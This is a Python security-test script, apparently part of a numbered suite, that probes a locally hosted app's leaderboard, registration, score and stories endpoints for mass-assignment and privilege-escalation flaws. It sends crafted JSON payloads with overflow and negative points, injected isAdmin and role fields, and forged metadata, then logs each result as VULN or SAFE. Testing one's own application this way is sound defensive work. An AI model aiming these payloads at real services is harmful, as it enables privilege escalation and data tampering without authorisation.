import requests
from colorama import Fore, Style, init

init(autoreset=True)
BASE = "http://localhost:8090"
RESULTS = []

def log(label, vuln, detail):
    color = Fore.RED if vuln else Fore.GREEN
    tag = "VULN" if vuln else "SAFE"
    print(f"  {color}[{tag}]{Style.RESET_ALL} {label}")
    if detail:
        print(f"         -> {detail}")
    RESULTS.append({"test": label, "vulnerable": vuln, "detail": detail})

def section(title):
    print(f"\n{'='*60}\n  {title}\n{'='*60}")

# ---- T1: XP/Score inflation via bonus endpoint ----------------------------------
def test_xp_inflation():
    section("T1 . XP Inflation via Unauthenticated Bonus Endpoint")
    # Award massive XP without any auth
    payloads = [
        {"username": "TestUser123", "points": 999999},
        {"username": "TestUser123", "points": -999999},
        {"username": "TestUser123", "points": 0},
        {"username": "TestUser123", "points": 9999999999},
        {"username": "TestUser123", "points": 2147483647},   # INT_MAX
        {"username": "TestUser123", "points": 2147483648},   # INT overflow
        {"username": "TestUser123", "points": 1.5},          # float
    ]
    for p in payloads:
        try:
            r = requests.post(f"{BASE}/api/leaderboard/bonus", json=p, timeout=5)
            vuln = r.status_code in [200, 201]
            log(f"POST /api/leaderboard/bonus points={p['points']}", vuln,
                f"HTTP {r.status_code}")
        except Exception as e:
            log(f"XP inflation points={p['points']}", False, str(e))

# ---- T2: Register with privileged fields ----------------------------------------
def test_register_privilege_fields():
    section("T2 . Privilege Field Injection via Register")
    test_users = [
        {"username": "PrivUser1", "password": "pw", "score": 100000, "level": 99, "isAdmin": True},
        {"username": "PrivUser2", "password": "pw", "role": "ADMIN", "permissions": ["ALL"]},
        {"username": "PrivUser3", "password": "pw", "rank": 1, "badge": "GOD_MODE"},
        {"username": "PrivUser4", "password": "pw", "xp": 9999999, "prestige": 10},
    ]
    for p in test_users:
        try:
            r = requests.post(f"{BASE}/api/auth/register", json=p, timeout=5)
            data = {}
            try:
                data = r.json()
            except Exception:
                pass
            extra = {k: v for k, v in p.items() if k not in ("username", "password")}
            injected = any(str(v) in str(data) for v in extra.values())
            vuln = injected and r.status_code in [200, 201]
            log(f"Register {p['username']} with fields: {list(extra.keys())}", vuln,
                f"HTTP {r.status_code} - injected fields reflected: {injected}")
        except Exception as e:
            log(f"Register privilege injection", False, str(e))

# ---- T3: Update user score via PATCH/PUT ----------------------------------------
def test_direct_score_update():
    section("T3 . Direct Score Manipulation via API")
    for path in ["/api/user/update", "/api/leaderboard/update", "/api/profile/score"]:
        try:
            r = requests.post(f"{BASE}{path}",
                              json={"username": "TestUser123", "score": 999999, "level": 100},
                              timeout=5)
            vuln = r.status_code in [200, 201]
            log(f"Direct score update at POST {path}", vuln, f"HTTP {r.status_code}")
        except Exception as e:
            log(f"Score update {path}", False, str(e))
    for path in ["/api/user/TestUser123", "/api/leaderboard/TestUser123"]:
        try:
            r = requests.put(f"{BASE}{path}",
                             json={"score": 999999, "level": 100},
                             timeout=5)
            vuln = r.status_code in [200, 201]
            log(f"PUT {path} score=999999", vuln, f"HTTP {r.status_code}")
        except Exception as e:
            log(f"PUT score update {path}", False, str(e))

# ---- T4: Story metadata injection -----------------------------------------------
def test_story_metadata_injection():
    section("T4 . Story Metadata Mass Assignment")
    payloads = [
        {"username": "TestUser123", "caption": "Test", "mediaUrl": "", "id": 1, "viewCount": 9999},
        {"username": "TestUser123", "caption": "Test", "mediaUrl": "", "createdAt": "2000-01-01T00:00:00", "expiresAt": "2099-01-01T00:00:00"},
        {"username": "TestUser123", "caption": "Test", "mediaUrl": "", "hidden": False, "featured": True},
    ]
    for p in payloads:
        try:
            r = requests.post(f"{BASE}/api/stories", json=p, timeout=5)
            data = {}
            try:
                data = r.json()
            except Exception:
                pass
            injected_keys = [k for k in p if k not in ("username", "caption", "mediaUrl")]
            injected = any(str(p[k]) in str(data) for k in injected_keys)
            vuln = injected and r.status_code in [200, 201]
            log(f"Story creation with injected fields: {injected_keys}", vuln,
                f"HTTP {r.status_code} - fields reflected: {injected}")
        except Exception as e:
            log("Story metadata injection", False, str(e))

# ---- T5: Negative points / integer overflow via XP award ------------------------
def test_xp_overflow():
    section("T5 . Integer Overflow / Negative XP Award")
    # Get baseline
    try:
        before = requests.get(f"{BASE}/api/leaderboard", timeout=5).json()
        before_score = next((u.get("score", 0) for u in before if u.get("username") == "TestUser123"), 0)
    except Exception:
        before_score = -1

    # Award negative then huge points
    for pts in [-9999999, 2**31 - 1, 2**31, 2**63 - 1]:
        try:
            requests.post(f"{BASE}/api/leaderboard/bonus",
                          json={"username": "TestUser123", "points": pts}, timeout=5)
        except Exception:
            pass

    try:
        after = requests.get(f"{BASE}/api/leaderboard", timeout=5).json()
        after_score = next((u.get("score", 0) for u in after if u.get("username") == "TestUser123"), 0)
        changed = after_score != before_score
        log("XP overflow / negative award caused score change", changed,
            f"Before={before_score}  After={after_score}  Delta={after_score - before_score}")
    except Exception as e:
        log("XP overflow check", False, str(e))

def run():
    print("\n" + "#"*60)
    print("  06 . MASS ASSIGNMENT AND PRIVILEGE ESCALATION")
    print("#"*60)
    test_xp_inflation()
    test_register_privilege_fields()
    test_direct_score_update()
    test_story_metadata_injection()
    test_xp_overflow()
    vuln_count = sum(1 for r in RESULTS if r["vulnerable"])
    print(f"\nSUMMARY: {vuln_count}/{len(RESULTS)} tests flagged VULNERABLE\n")
    return RESULTS

if __name__ == "__main__":
    run()
